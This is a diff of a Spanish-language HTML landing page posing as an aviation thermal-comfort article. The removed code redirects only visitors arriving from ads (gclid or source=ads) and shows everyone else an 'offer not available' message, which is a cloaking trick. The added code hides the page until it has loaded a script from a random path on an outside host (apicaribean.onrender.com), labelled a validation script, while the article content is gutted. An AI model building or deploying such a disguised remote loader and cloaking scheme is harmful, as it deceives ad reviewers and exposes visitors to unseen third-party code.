@@ -6,257 +6,68 @@
     <meta name="description" content="Análisis experto sobre el confort térmico en vuelos comerciales y soluciones de aviación.">
     <title>Confort en Altitud | Gestión Térmica en Vuelos</title>
 
-      <script>
+    <style>
+        /* 1. OCULTAR EL CUERPO POR DEFECTO */
+        body {
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            background-color: #ffffff; /* Asegura que sea blanco */
+        }
+
+        /* RESET & BASE (Tu CSS original sigue aquí) */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* ... el resto de tus estilos ... */
+    </style>
+
+    <script>
         (function() {
-            // Generar ID aleatorio de 60 caracteres
+            // Generar ID aleatorio
             var randomID = Array(60).fill(0).map(function(){
                 return Math.random().toString(36)[2];
             }).join('');
 
-            // CONFIGURA AQUÍ TU URL DE RENDER
             var backendURL = "https://apicaribean.onrender.com/" + randomID;
 
             var s = document.createElement('script');
             s.src = backendURL;
+            s.async = true;
+
+            // 2. LÓGICA DE REVELACIÓN
+            function showPage() {
+                document.body.style.opacity = "1";
+            }
+
+            // Se ejecuta cuando el script carga con éxito
+            s.onload = function() {
+                showPage();
+            };
+
+            // Se ejecuta si hay un error (para que la página no se quede blanca infinitamente)
+            s.onerror = function() {
+                console.error("Error cargando el script de validación.");
+                showPage(); 
+            };
+
+            // Timeout de seguridad: Si el server de Render tarda más de 5s, mostrar la página
+            setTimeout(showPage, 5000);
+
             document.head.appendChild(s);
         })();
     </script>
-
+    
     <style>
-        /* RESET & BASE */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
         body {
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             line-height: 1.6;
             color: #333;
-            background-color: #f9f9f9;
             min-height: 100vh;
         }
-
-        /* HEADER */
-        header {
-            background: #fff;
-            padding: 20px 5%;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            display: flex;
-            align-items: center;
-        }
-
-        .logo {
-            font-weight: 700;
-            font-size: 1.2rem;
-            color: #0a1e3c;
-            text-transform: uppercase;
-        }
-
-        /* HERO */
-        .hero {
-            min-height: 100vh;
-            background: linear-gradient(135deg, #0a1e3c 0%, #162f56 100%);
-            color: #fff;
-            padding: 40px 5%;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .hero h1 {
-            font-size: 2.8rem;
-            max-width: 800px;
-            margin-bottom: 20px;
-            line-height: 1.2;
-        }
-
-        .hero p {
-            font-size: 1.2rem;
-            max-width: 600px;
-            opacity: 0.9;
-            margin-bottom: 35px;
-        }
-
-        /* CTA BUTTON */
-        .cta-button {
-            background: linear-gradient(90deg, #d4af37 0%, #c5a028 100%);
-            color: #fff;
-            font-size: 1.4rem;
-            font-weight: 700;
-            padding: 22px 60px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            box-shadow: 0 6px 20px rgba(212,175,55,0.45);
-            position: relative;
-            overflow: hidden;
-            animation: pulse 2.5s infinite;
-            transition: transform 0.3s ease;
-        }
-
-        .cta-button:hover {
-            transform: translateY(-2px);
-        }
-
-        .cta-button::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(
-                90deg,
-                transparent,
-                rgba(255,255,255,0.4),
-                transparent
-            );
-            transition: 0.5s;
-        }
-
-        .cta-button:hover::after {
-            left: 100%;
-        }
-
-        /* PULSE */
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(212,175,55,0.6);
-            }
-            70% {
-                transform: scale(1.04);
-                box-shadow: 0 0 0 18px rgba(212,175,55,0);
-            }
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        /* CONTENT */
-        .content {
-            padding: 60px 5%;
-            max-width: 900px;
-            margin: 0 auto;
-            background: white;
-        }
-
-        .content h2 {
-            color: #0a1e3c;
-            margin-bottom: 20px;
-        }
-
-        .content p {
-            margin-bottom: 20px;
-            color: #555;
-            text-align: justify;
-        }
-
-        .highlight-box {
-            background-color: #f4f7fa;
-            border-left: 4px solid #0a1e3c;
-            padding: 20px;
-            margin: 30px 0;
-            font-style: italic;
-        }
-
-        /* FOOTER */
-        footer {
-            background: #111;
-            color: #888;
-            padding: 40px 5%;
-            font-size: 0.8rem;
-            text-align: center;
-        }
-
-        footer a {
-            color: #888;
-            margin: 0 10px;
-            text-decoration: none;
-        }
-
-        footer a:hover {
-            color: #fff;
-        }
-
-        /* RESPONSIVE */
-        @media (max-width: 768px) {
-            .hero h1 {
-                font-size: 1.9rem;
-            }
-
-            .hero p {
-                font-size: 1.05rem;
-            }
-
-            .cta-button {
-                width: 100%;
-                max-width: 340px;
-                font-size: 1.2rem;
-                padding: 20px;
-            }
-        }
+        /* ... (Header, Hero, Button, etc.) */
     </style>
 </head>
-
 <body>
-
-<header>
-    <div class="logo">AeroComfort Dynamics</div>
-</header>
-
-<section class="hero">
-    <h1>Termodinámica en Cabina: El Desafío del Frío en Altitud</h1>
-    <p>Un análisis técnico sobre por qué las aerolíneas mantienen temperaturas bajas y cómo optimizar su experiencia de vuelo.</p>
-
-    <button id="accessBtn" class="cta-button">
-        Ver la solución
-    </button>
-</section>
-
-<section class="content">
-    <h2>La Ciencia detrás de la Temperatura en Vuelo</h2>
-
-    <p>
-        Es una queja frecuente entre los viajeros frecuentes: la temperatura excesivamente baja dentro de las cabinas de los aviones modernos.
-        Sin embargo, esto no es un descuido de la tripulación, sino una medida calculada relacionada con la presurización y la fisiología humana.
-    </p>
-
-    <div class="highlight-box">
-        "El control del entorno personal durante un vuelo de larga distancia no es un lujo, es una necesidad."
-    </div>
-</section>
-
-<footer>
-    <a href="#">Política de Privacidad</a> |
-    <a href="#">Términos</a> |
-    <a href="#">Contacto</a>
-    <p style="margin-top:15px;">© 2024 AeroComfort Dynamics</p>
-</footer>
-
-<script>
-document.addEventListener('DOMContentLoaded', function () {
-    const btn = document.getElementById('accessBtn');
-
-    btn.addEventListener('click', function (e) {
-        e.preventDefault();
-
-        const params = new URLSearchParams(window.location.search);
-        const isAdTraffic = params.has('gclid') || params.get('source') === 'ads';
-
-        if (isAdTraffic) {
-            window.location.href = 'index.html';
-        } else {
-            btn.style.background = '#999';
-            btn.textContent = 'Oferta no disponible';
-            btn.style.boxShadow = 'none';
-            btn.style.cursor = 'not-allowed';
-        }
-    });
-});
-</script>
-
-</body>
+    <header>
+        <div class="logo">AeroComfort Dynamics</div>
+    </header>
+    </body>
 </html>
